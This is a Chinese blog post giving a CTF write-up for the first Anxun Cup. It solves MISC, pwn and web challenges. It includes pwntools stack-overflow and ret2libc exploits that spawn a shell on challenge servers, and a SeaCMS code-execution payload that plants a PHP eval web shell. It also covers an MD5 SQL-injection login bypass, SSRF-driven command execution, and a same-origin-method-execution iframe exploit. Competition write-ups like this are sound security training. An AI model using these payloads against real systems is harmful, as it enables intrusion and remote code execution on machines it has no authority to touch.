@@ -1,0 +1,855 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="h1tler's blog" type="application/atom+xml" />
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/images/favicon.ico?v=5.1.2" />
+
+
+
+
+
+
+<meta name="description" content="第一届安洵杯writeup线上赛混个第三名，跟着大佬们，躺进下线赛了。 MISC这里是签到题应高数高分大佬要求，签到题为下图：https://i.loli.net/2018/11/23/5bf7fef997715.jpgmd5小写例子:D0g3{21232f297a57a5a743894a0e4a801fc3}格式D0g3{md5(幺元)}https://zhidao.baidu.com/ques">
+<meta property="og:type" content="article">
+<meta property="og:title" content="第一届安洵杯writeup">
+<meta property="og:url" content="http://www.cuittk.cn/2018/11/27/第一届安洵杯writeup/index.html">
+<meta property="og:site_name" content="h1tler&#39;s blog">
+<meta property="og:description" content="第一届安洵杯writeup线上赛混个第三名，跟着大佬们，躺进下线赛了。 MISC这里是签到题应高数高分大佬要求，签到题为下图：https://i.loli.net/2018/11/23/5bf7fef997715.jpgmd5小写例子:D0g3{21232f297a57a5a743894a0e4a801fc3}格式D0g3{md5(幺元)}https://zhidao.baidu.com/ques">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://img.cdn.cuittk.cn/eh4koonnh3tpr1hfbp8ckrd0ft.png">
+<meta property="og:image" content="http://img.cdn.cuittk.cn/75qc8jxf3vezsbm4gx8r9u1kpr.png">
+<meta property="og:image" content="http://img.cdn.cuittk.cn/txr6xrku8v20rmtfuh2awqshh0.png">
+<meta property="og:image" content="http://img.cdn.cuittk.cn/zuktirc0jyodpimnl27j0qyilt.png">
+<meta property="og:image" content="http://img.cdn.cuittk.cn/a559qosl4bhs3vt4fa8n5gf340.png">
+<meta property="og:image" content="http://img.cdn.cuittk.cn/xxpcms93hip2pmrl667php7tu7.png">
+<meta property="og:image" content="http://img.cdn.cuittk.cn/5ygnuyenrduc8j4v7mc2ku1aqy.png">
+<meta property="og:image" content="http://img.cdn.cuittk.cn/fnw9ls4b9q5v12t40qsmcba35l.png">
+<meta property="og:image" content="http://img.cdn.cuittk.cn/scsp2dkgdl6m98ddphx4um0u23.png">
+<meta property="og:image" content="http://img.cdn.cuittk.cn/zfax8venhi8p80mrbheujok8iw.png">
+<meta property="og:image" content="http://img.cdn.cuittk.cn/njplvqgr69od24j4iy4f87y5e9.png">
+<meta property="og:image" content="http://img.cdn.cuittk.cn/c413huby44pld2eaor1160bt0g.png">
+<meta property="og:image" content="http://img.cdn.cuittk.cn/f8w4p8w8rb43g4xo8t9rc7k8x5.png">
+<meta property="og:image" content="http://img.cdn.cuittk.cn/raufsc6qc3tvgaufza9ejv9r4q.png">
+<meta property="og:image" content="http://img.cdn.cuittk.cn/tmtqb7u3ljxderi2cikhly6nu3.png">
+<meta property="og:image" content="http://img.cdn.cuittk.cn/wnwo12srba5ahfigcjma3e1ksm.png">
+<meta property="og:image" content="http://img.cdn.cuittk.cn/8z8m7k6xve1m7w06foqp8yonoe.png">
+<meta property="og:image" content="http://img.cdn.cuittk.cn/5emtatwmjc1y8xozdk1zkumnm6.png">
+<meta property="og:image" content="http://img.cdn.cuittk.cn/tuux0wijxfj38mvrv4b9hr4cmc.png">
+<meta property="og:image" content="http://img.cdn.cuittk.cn/gipzyphsbjz41qjl5qz028o2pr.png">
+<meta property="og:image" content="http://img.cdn.cuittk.cn/a2v7ryrwqcn89b08ejw0nq2ofa.png">
+<meta property="og:image" content="http://img.cdn.cuittk.cn/ati2n6xmch74lrnkpkswnwd8to.png">
+<meta property="og:image" content="http://img.cdn.cuittk.cn/ir40vl0zq47yc4bsyikqc04x9l.png">
+<meta property="og:image" content="http://img.cdn.cuittk.cn/i8y0sz7ghh93sdvl6f1j9rzpps.png">
+<meta property="og:image" content="http://img.cdn.cuittk.cn/e6sm6gf0xiozu2qys8768d2cvj.png">
+<meta property="og:image" content="http://img.cdn.cuittk.cn/se77qetu5ix56rjut92ob3z69a.png">
+<meta property="og:image" content="http://img.cdn.cuittk.cn/xlpf26yhm5ay8lrdtn6eo9zebq.png">
+<meta property="og:image" content="http://img.cdn.cuittk.cn/p84ezegrblw61rlj5xfnnpwze6.png">
+<meta property="og:image" content="http://img.cdn.cuittk.cn/0ojtz03oml2chmo9l5nvztvnuq.png">
+<meta property="og:image" content="http://img.cdn.cuittk.cn/ownfuv1g1egsy7fe1yi2nkoi52.png">
+<meta property="og:image" content="http://img.cdn.cuittk.cn/1774cramyqzolwreros5q3e1xl.png">
+<meta property="og:image" content="http://img.cdn.cuittk.cn/xbclo5hrrhk6ghemlqbp4dkcpu.png">
+<meta property="og:image" content="http://img.cdn.cuittk.cn/ur395jrl3qujiy7g69fhn54elj.png">
+<meta property="og:updated_time" content="2018-11-27T10:01:09.974Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="第一届安洵杯writeup">
+<meta name="twitter:description" content="第一届安洵杯writeup线上赛混个第三名，跟着大佬们，躺进下线赛了。 MISC这里是签到题应高数高分大佬要求，签到题为下图：https://i.loli.net/2018/11/23/5bf7fef997715.jpgmd5小写例子:D0g3{21232f297a57a5a743894a0e4a801fc3}格式D0g3{md5(幺元)}https://zhidao.baidu.com/ques">
+<meta name="twitter:image" content="http://img.cdn.cuittk.cn/eh4koonnh3tpr1hfbp8ckrd0ft.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.2',
+    sidebar: {"position":"left","display":"always","offset":12,"offset_float":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://www.cuittk.cn/2018/11/27/第一届安洵杯writeup/"/>
+
+
+
+
+
+  <title>第一届安洵杯writeup | h1tler's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">h1tler's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://www.cuittk.cn/2018/11/27/第一届安洵杯writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="h1tler">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/2.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="h1tler's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">第一届安洵杯writeup</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-27T17:01:28+08:00">
+                2018-11-27
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web安全/" itemprop="url" rel="index">
+                    <span itemprop="name">web安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i> 浏览
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>次
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="第一届安洵杯writeup"><a href="#第一届安洵杯writeup" class="headerlink" title="第一届安洵杯writeup"></a>第一届安洵杯writeup</h2><p>线上赛混个第三名，跟着大佬们，躺进下线赛了。</p>
+<h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><h4 id="这里是签到题"><a href="#这里是签到题" class="headerlink" title="这里是签到题"></a>这里是签到题</h4><p>应高数高分大佬要求，签到题为下图：<br><a href="https://i.loli.net/2018/11/23/5bf7fef997715.jpg" target="_blank" rel="external">https://i.loli.net/2018/11/23/5bf7fef997715.jpg</a><br>md5小写<br>例子:D0g3{21232f297a57a5a743894a0e4a801fc3}<br>格式<br>D0g3{md5(幺元)}<br><a href="https://zhidao.baidu.com/question/1114204049719347299.html" target="_blank" rel="external">https://zhidao.baidu.com/question/1114204049719347299.html</a></p>
+<p>从最右边一列找一个元素，它所在行与表头的首行完全一致，即为左幺元，图中是c。<br>从最上边一行找一个元素，它所在列与表头的首列完全一致，即为右幺元，图中是c。<br>所以c是幺元。<br>Md5(c)= 4a8a08f09d37b73795649038408b5f33<br>D0g3{4a8a08f09d37b73795649038408b5f33}</p>
+<h4 id="boooooom"><a href="#boooooom" class="headerlink" title="boooooom"></a>boooooom</h4><p>第一个压缩包，提示CRC爆破结果是纯数字，直接爆破<br>里面三个文件，看了一下大概是要先解压password然后运行.py计算flag.zip的解压密码。<br>然后crc32碰撞，直接爆破password.txt的内容<br><figure class="highlight plain"><figcaption><span>zlib</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">for i in xrange(0,100000000):</div><div class="line">	buf = str(i).rjust(8,&apos;0&apos;)</div><div class="line">	#print buf</div><div class="line">    if zlib.crc32(buf) &amp; 0xffffffff == 0x0cd95dac:</div><div class="line">		print &apos;&apos;,buf</div></pre></td></tr></table></figure></p>
+<p><img src="http://img.cdn.cuittk.cn/eh4koonnh3tpr1hfbp8ckrd0ft.png" alt=""><br>然后再用.py跑<br><figure class="highlight plain"><figcaption><span>base64</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">import hashlib</div><div class="line">#f = open(&quot;password.txt&quot;,&apos;r&apos;)</div><div class="line">#password = f.readline()</div><div class="line">password=&apos;08646247&apos;</div><div class="line">b64_str = base64.b64encode(password.encode(&apos;utf-8&apos;))</div><div class="line">hash = hashlib.md5()</div><div class="line">hash.update(b64_str)</div><div class="line">zip_passowrd = hash.hexdigest()</div><div class="line">print(zip_passowrd)</div></pre></td></tr></table></figure></p>
+<p> <img src="http://img.cdn.cuittk.cn/75qc8jxf3vezsbm4gx8r9u1kpr.png" alt=""><br> 再去解压flag.zip,解压出来一张图片<br>改高度，先直接winhex改了过后图片直接崩了，然后绕了一会，结果就是该高度，winhex不对应该是crc的原因。用tweakPNG改<br><img src="http://img.cdn.cuittk.cn/txr6xrku8v20rmtfuh2awqshh0.png" alt=""><br>修改高度为500<br><img src="http://img.cdn.cuittk.cn/zuktirc0jyodpimnl27j0qyilt.png" alt=""><br>可以看到flag了导出图片 提取文字完事。<br><img src="http://img.cdn.cuittk.cn/a559qosl4bhs3vt4fa8n5gf340.png" alt=""><br>D0g3{a184929e2c170e2b7dc12eb3106f0a16}</p>
+<h3 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h3><h4 id="Hiahiahia"><a href="#Hiahiahia" class="headerlink" title="Hiahiahia"></a>Hiahiahia</h4><p>入门pwn，栈溢出到arg[0]<br>check一下，有NX和canary<br><img src="http://img.cdn.cuittk.cn/xxpcms93hip2pmrl667php7tu7.png" alt=""><br>Gdb调试下<br><img src="http://img.cdn.cuittk.cn/5ygnuyenrduc8j4v7mc2ku1aqy.png" alt=""><br><img src="http://img.cdn.cuittk.cn/fnw9ls4b9q5v12t40qsmcba35l.png" alt=""><br>找到flag和arg[0]的地址算一下偏移<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/python</div><div class="line">from pwn import *</div><div class="line">context.log_level = &apos;debug&apos;</div><div class="line">old_flag_addr = 0x4007a8</div><div class="line">new_flag_addr = 0x6007a8</div><div class="line">p = remote(&apos;149.248.7.48&apos;, 8888)</div><div class="line">p.recvuntil(&quot;Please find the flag!&quot;)</div><div class="line">#gdb.attach(p)</div><div class="line">#payload = &quot;a&quot;*0x218 + p64(new_flag_addr)</div><div class="line">payload = &apos;a&apos;* 360 + p64(old_flag_addr)</div><div class="line">p.sendline(payload)</div><div class="line">flag = p.recv()</div><div class="line">print flag</div></pre></td></tr></table></figure></p>
+<p>flag:D0g3{ccc_y0u_again<em>hiahiahia</em>}</p>
+<h4 id="neko"><a href="#neko" class="headerlink" title="neko"></a>neko</h4><p>栈溢出，有system地址，leak libc。。。。<br>去libcdb查版本  然后基本操作栈溢出<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/python</div><div class="line">from pwn import *</div><div class="line">EXE = &quot;./neko&quot;</div><div class="line">e = ELF(EXE)</div><div class="line">libc = e.libc</div><div class="line">io = remote(&apos;149.248.7.48&apos;,9999)</div><div class="line">system = e.plt[&quot;system&quot;]</div><div class="line">puts = e.plt[&quot;puts&quot;]</div><div class="line">puts_got = e.got[&quot;puts&quot;]</div><div class="line">io.sendlineafter(&quot;cats?\n&quot;,&apos;y&apos;)</div><div class="line">payload = &quot;a&quot; * 0xd4</div><div class="line">payload += p32(puts)</div><div class="line">payload += p32(0x080486E7)</div><div class="line">payload += p32(puts_got)</div><div class="line">io.sendafter(&quot;anchovies:\n&quot;,payload)</div><div class="line">io.recvline()</div><div class="line">base = u32(io.recv(4)) - 0x05f140</div><div class="line">binsh = base + 0x15902b</div><div class="line">payload = &quot;a&quot; * 0xd4</div><div class="line">payload += p32(system)</div><div class="line">payload += p32(binsh) * 2</div><div class="line">io.sendafter(&quot;anchovies:\n&quot;,payload)</div><div class="line">io.interactive()</div></pre></td></tr></table></figure></p>
+<p>flag: D0g3{Wh0_Doe5n’t_1ik3_k1tt3ns??}</p>
+<h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="web1-无限手套"><a href="#web1-无限手套" class="headerlink" title="web1-无限手套"></a>web1-无限手套</h4><p>提示输入NOHO<br>测出来要求在7399999999到7400000000<br><a href="http://222.18.158.227:10580/?NOHO[]=d" target="_blank" rel="external">http://222.18.158.227:10580/?NOHO[]=d</a>  数组绕过<br><img src="http://img.cdn.cuittk.cn/scsp2dkgdl6m98ddphx4um0u23.png" alt=""><br>输密码<br><!--SELECT master FROM secret WHERE password = binary '!#/)zW��C�JJ�¬�'--><br>发现是MD5加密后16进制转字符<br>md5(admin,32) = 21232f297a57a5a743894a0e4a801fc3<br><img src="http://img.cdn.cuittk.cn/zfax8venhi8p80mrbheujok8iw.png" alt=""><br>想到了md5加密后再16进制转字符串后有单引号引起sql注入。以前做过md5 sql注入。<br><a href="http://222.18.158.227:10580/?NOHO[]=123" target="_blank" rel="external">http://222.18.158.227:10580/?NOHO[]=123</a><br>POST：password=ffifdyop<br>ffifdyop md5()加密-》276f722736c95d99e921722cf9ed621c -》再16进制转字符串为’or’6?]??!r,??b<br><img src="http://img.cdn.cuittk.cn/njplvqgr69od24j4iy4f87y5e9.png" alt=""><br>得到flag:<br>e5e8b79aeb213ad6e0e4664e78aff61b<br>D0g3{e5e8b79aeb213ad6e0e4664e78aff61b}</p>
+<h4 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h4><p>Find The d0g3.php In Intranets<br><a href="http://222.18.158.227:10180/" target="_blank" rel="external">http://222.18.158.227:10180/</a><br>点了几个图后输入name提交后为<br><a href="http://222.18.158.227:10180/?url=111" target="_blank" rel="external">http://222.18.158.227:10180/?url=111</a><br>有url，提示<br><img src="http://img.cdn.cuittk.cn/c413huby44pld2eaor1160bt0g.png" alt=""><br>The Intranets are in range 10.10.1.0/16<br>那么d0g3.php就应该在内网<br>那就从10.10.1.1开始找<br><a href="http://222.18.158.227:10180/?url=http://10.10.1.1/d0g3.php" target="_blank" rel="external">http://222.18.158.227:10180/?url=http://10.10.1.1/d0g3.php</a><br><a href="http://222.18.158.227:10180/?url=http://10.10.1.3/d0g3.php" target="_blank" rel="external">http://222.18.158.227:10180/?url=http://10.10.1.3/d0g3.php</a> 返回404<br><a href="http://222.18.158.227:10180/?url=http://10.10.1.6/d0g3.php" target="_blank" rel="external">http://222.18.158.227:10180/?url=http://10.10.1.6/d0g3.php</a><br>找到了，在<a href="http://10.10.1.6/d0g3.php有200回显了" target="_blank" rel="external">http://10.10.1.6/d0g3.php有200回显了</a><br><img src="http://img.cdn.cuittk.cn/f8w4p8w8rb43g4xo8t9rc7k8x5.png" alt=""><br>提示GET d0g3参数。<br>尝试了<a href="http://222.18.158.227:10180/?url=http://10.10.1.6/d0g3.php?d0g3=phpinfo(" target="_blank" rel="external">http://222.18.158.227:10180/?url=http://10.10.1.6/d0g3.php?d0g3=phpinfo(</a>);<br>发现是个官方shell<br><a href="http://222.18.158.227:10180/?url=http://10.10.1.6/d0g3.php?d0g3=echo" target="_blank" rel="external">http://222.18.158.227:10180/?url=http://10.10.1.6/d0g3.php?d0g3=echo</a> `ls`;<br>打印当前目录，发现flag.txt<br>直接读<br><a href="http://222.18.158.227:10180/?url=http://10.10.1.6/d0g3.php?d0g3=echo" target="_blank" rel="external">http://222.18.158.227:10180/?url=http://10.10.1.6/d0g3.php?d0g3=echo</a> `cat flag.txt`;<br>D0g3{SSRF_Is_So_Easy}</p>
+<h4 id="only-d0g3er-can-see-flag"><a href="#only-d0g3er-can-see-flag" class="headerlink" title="only d0g3er can see flag"></a>only d0g3er can see flag</h4><p><a href="http://138.68.2.14/seacms/" target="_blank" rel="external">http://138.68.2.14/seacms/</a><br>查找poc getshell<br><a href="https://www.freebuf.com/vuls/150042.html" target="_blank" rel="external">https://www.freebuf.com/vuls/150042.html</a><br><a href="http://138.68.2.14/seacms/search.php" target="_blank" rel="external">http://138.68.2.14/seacms/search.php</a><br>post:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">searchtype=5&amp;searchword=&#123;if&#123;searchpage:year&#125;&amp;year=:e&#123;searchpage:area&#125;&#125;&amp;area=v&#123;searchpage:letter&#125;&amp;letter=al&#123;searchpage:lang&#125;&amp;yuyan=(join&#123;searchpage:jq&#125;&amp;jq=($_P&#123;searchpage:ver&#125;&amp;&amp;ver=OST[9]))&amp;&amp;9[]=phpinfo();</div></pre></td></tr></table></figure></p>
+<p>那就写shell吧<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">searchtype=5&amp;searchword=&#123;if&#123;searchpage:year&#125;&amp;year=:e&#123;searchpage:area&#125;&#125;&amp;area=v&#123;searchpage:letter&#125;&amp;letter=al&#123;searchpage:lang&#125;&amp;yuyan=(join&#123;searchpage:jq&#125;&amp;jq=($_P&#123;searchpage:ver&#125;&amp;&amp;ver=OST[9]))&amp;9[]=file_put_contents(&apos;a.php&apos;,&apos;&lt;?php%20@eval($_POST[c])?&gt;&apos;);</div></pre></td></tr></table></figure></p>
+<p>提示.git泄露，用工具读出源码吧<br>\data\ common.inc.php有配置信息<br><img src="http://img.cdn.cuittk.cn/raufsc6qc3tvgaufza9ejv9r4q.png" alt=""><br>菜刀直接连接数据库读取flag<br><img src="http://img.cdn.cuittk.cn/tmtqb7u3ljxderi2cikhly6nu3.png" alt=""><br><img src="http://img.cdn.cuittk.cn/wnwo12srba5ahfigcjma3e1ksm.png" alt=""><br>RDBnM3tUaGlzX2lzX3JlYWxfZmxhZ30=<br>Base64解码：D0g3{This_is_real_flag}<br>我要吐槽一下，出题人是想考什么？改了两次题。<br>第一次题目的时候还有360防护……要我绕360吗？<br>昨天晚上还是138.68.2.14/。上传shell后，数据库中没有flag数据库，D0g3数据库中也没有flag信息。/www/wwwroot/的shell目录中有.user.ini文件限制，我在绕open_basedir。但是也只能用glob伪协议读目录。但是flag数据库目录在/www/server/data/flag还有在 /www/backup/database/下有备份文件flag。也没研究过怎么在没有系统命令下还要绕open_basedir读文件。</p>
+<h4 id="BOOM"><a href="#BOOM" class="headerlink" title="BOOM"></a>BOOM</h4><p>御剑扫目录<br>后台登录地址：<a href="http://222.18.158.227:10080/admin/login.html" target="_blank" rel="external">http://222.18.158.227:10080/admin/login.html</a><br>题目是boom就直接爆破吧，看题目描述应该是绕过这个验证码，刷新数字变大，估计是时间戳生成。<br><img src="http://img.cdn.cuittk.cn/8z8m7k6xve1m7w06foqp8yonoe.png" alt=""><br>但是测了一下可以直接空等于空绕过，然后直接intruder爆破<br>爆了很久的弱口令 结果是纯数字 很坑。<br><img src="http://img.cdn.cuittk.cn/5emtatwmjc1y8xozdk1zkumnm6.png" alt=""><br>登录拿flag<br><img src="http://img.cdn.cuittk.cn/tuux0wijxfj38mvrv4b9hr4cmc.png" alt=""><br>D0g3{70e052657cb40cf142883abaff266fee}</p>
+<h4 id="webN"><a href="#webN" class="headerlink" title="webN"></a>webN</h4><p>首页一个SRC界面，没什么用<br><img src="http://img.cdn.cuittk.cn/gipzyphsbjz41qjl5qz028o2pr.png" alt=""><br>点礼品中心<a href="http://222.18.158.245:6080/reward.php点击购买" target="_blank" rel="external">http://222.18.158.245:6080/reward.php点击购买</a><br><img src="http://img.cdn.cuittk.cn/a2v7ryrwqcn89b08ejw0nq2ofa.png" alt=""><br>发现用户可控jsonp<br><img src="http://img.cdn.cuittk.cn/ati2n6xmch74lrnkpkswnwd8to.png" alt=""><br>看提示some攻击，翻文章<br><a href="https://paper.tuisec.win/detail/05c9c8b3e28bd2b" target="_blank" rel="external">https://paper.tuisec.win/detail/05c9c8b3e28bd2b</a><br><a href="https://www.freebuf.com/articles/web/169873.html" target="_blank" rel="external">https://www.freebuf.com/articles/web/169873.html</a><br>点礼品中心<a href="http://222.18.158.245:6080/reward.php点击购买" target="_blank" rel="external">http://222.18.158.245:6080/reward.php点击购买</a><br>然后还提示联系客服，思路大概就是构造exp放vps上，发客服让机器人访问，子页面通过可控jsonp对父页面操作<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">&lt;iframe src=&quot;http://222.18.158.245:6080/reward.php&quot; name=b&gt;&lt;/iframe&gt;</div><div class="line">        &lt;iframe name=a&gt;&lt;/iframe&gt;</div><div class="line">        &lt;script&gt;</div><div class="line">        window.frames[0].open(&apos;http://222.18.158.245:6080/confirm.php&apos;,&apos;a&apos;);</div><div class="line">        setTimeout(</div><div class="line">          function()&#123;</div><div class="line">            window.frames[1].location.href = &apos;http://222.18.158.245:6080/confirm.php?callback=window.opener.pay&apos;;</div><div class="line">          &#125;</div><div class="line">        ,1000);</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure></p>
+<p>查日志发现flag<br><img src="http://img.cdn.cuittk.cn/ir40vl0zq47yc4bsyikqc04x9l.png" alt=""><br>D0g3{Same_Orig1n_Method_ExCute_1s_eAsy}</p>
+<h4 id="Diglett"><a href="#Diglett" class="headerlink" title="Diglett"></a>Diglett</h4><p><a href="http://54.200.169.99:7001" target="_blank" rel="external">http://54.200.169.99:7001</a><br>查看源码：<img src="http://img.cdn.cuittk.cn/i8y0sz7ghh93sdvl6f1j9rzpps.png" alt="">提示 index.php?hu3debug=1<br><a href="http://54.200.169.99:7001/index.php?hu3debug=1" target="_blank" rel="external">http://54.200.169.99:7001/index.php?hu3debug=1</a><br>得到php源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">    include_once &quot;config.php&quot;;</div><div class="line">    if (isset($_POST[&apos;url&apos;])&amp;&amp;!empty($_POST[&apos;url&apos;]))</div><div class="line">    &#123;</div><div class="line">        $url = $_POST[&apos;url&apos;];</div><div class="line">        if(preg_match(&apos;/file/&apos;,$url))</div><div class="line">        &#123;</div><div class="line">             echo &quot;No hacker!&quot;;</div><div class="line">             echo &quot;&lt;/br&gt;&quot;;</div><div class="line">        &#125;</div><div class="line">        $url2 = preg_replace(&apos;/file/&apos;,&apos;&apos;,$url);</div><div class="line">        $content_url = getUrlContent($url2);</div><div class="line">    &#125;</div><div class="line">    else</div><div class="line">    &#123;</div><div class="line">        $content_url = &quot;&quot;;</div><div class="line">    &#125;</div><div class="line">    if(isset($_GET[&apos;hu3debug&apos;]))</div><div class="line">    &#123;</div><div class="line">        show_source(__FILE__);</div><div class="line">    &#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
